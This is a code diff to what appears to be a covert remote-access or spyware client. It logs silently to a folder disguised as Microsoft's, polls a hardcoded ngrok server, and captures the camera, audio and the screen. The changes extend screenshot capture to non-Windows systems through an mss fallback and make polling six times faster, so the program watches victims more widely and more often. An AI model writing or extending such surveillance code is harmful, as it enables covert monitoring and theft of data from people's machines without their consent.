@@ -30,8 +30,11 @@ sys.path.insert(0, os.path.abspath(_ROOT))
 sys.path.insert(0, os.path.abspath(_BASE))
 
 # ─── Logging (silent — file only) ────────────────────────────────────────────
-LOG_DIR = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")),
-                       "Microsoft", "Logs")
+if os.name == "nt":
+    LOG_DIR = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")),
+                           "Microsoft", "Logs")
+else:
+    LOG_DIR = os.path.join(os.path.expanduser("~"), ".cyberbridge", "logs")
 os.makedirs(LOG_DIR, exist_ok=True)
 logging.basicConfig(
     filename=os.path.join(LOG_DIR, "wsh.log"),
@@ -45,7 +48,7 @@ try:
     from config import SERVER_URL, POLL_INTERVAL
 except ImportError:
     SERVER_URL    = "https://marquis-prorefugee-lala.ngrok-free.app"
-    POLL_INTERVAL = 3
+    POLL_INTERVAL = 0.5
 
 # ─── Optional capability imports ─────────────────────────────────────────────
 try:
@@ -61,10 +64,21 @@ except ImportError:
     _AUDIO_AVAILABLE = False
 
 try:
-    from PIL import ImageGrab
+    from PIL import Image, ImageGrab
+    _PIL_IMAGE = Image
     _SCREENSHOT_AVAILABLE = True
+    _SCREENSHOT_BACKEND = "pil"
 except ImportError:
-    _SCREENSHOT_AVAILABLE = False
+    _PIL_IMAGE = None
+    try:
+        import mss
+        from PIL import Image
+        _PIL_IMAGE = Image
+        _SCREENSHOT_AVAILABLE = True
+        _SCREENSHOT_BACKEND = "mss"
+    except ImportError:
+        _SCREENSHOT_AVAILABLE = False
+        _SCREENSHOT_BACKEND = None
 
 try:
     import psutil
@@ -302,22 +316,37 @@ def _get_camera_frame() -> str:
 
 
 def _screenshot() -> str:
-    if not _SCREENSHOT_AVAILABLE:
+    if not _SCREENSHOT_AVAILABLE or not _PIL_IMAGE:
         return ""
     try:
-        img = ImageGrab.grab()
-        buf = io.BytesIO()
-        img.save(buf, format='JPEG', quality=60)
-        return base64.b64encode(buf.getvalue()).decode()
+        if _SCREENSHOT_BACKEND == "pil":
+            img = ImageGrab.grab()
+            buf = io.BytesIO()
+            img.save(buf, format='JPEG', quality=60)
+            return base64.b64encode(buf.getvalue()).decode()
+        elif _SCREENSHOT_BACKEND == "mss":
+            with mss.mss() as sct:
+                shot = sct.grab(sct.monitors[1])
+                img = _PIL_IMAGE.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
+                buf = io.BytesIO()
+                img.save(buf, format='JPEG', quality=60)
+                return base64.b64encode(buf.getvalue()).decode()
     except Exception:
         return ""
 
 
 def _screen_frame(quality: int = 45, scale: float = 0.6) -> str:
-    if not _SCREENSHOT_AVAILABLE:
+    if not _SCREENSHOT_AVAILABLE or not _PIL_IMAGE:
         return ""
     try:
-        img = ImageGrab.grab()
+        if _SCREENSHOT_BACKEND == "pil":
+            img = ImageGrab.grab()
+        elif _SCREENSHOT_BACKEND == "mss":
+            with mss.mss() as sct:
+                shot = sct.grab(sct.monitors[1])
+                img = _PIL_IMAGE.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
+        else:
+            return ""
         w = int(img.width * scale)
         h = int(img.height * scale)
         img = img.resize((w, h))
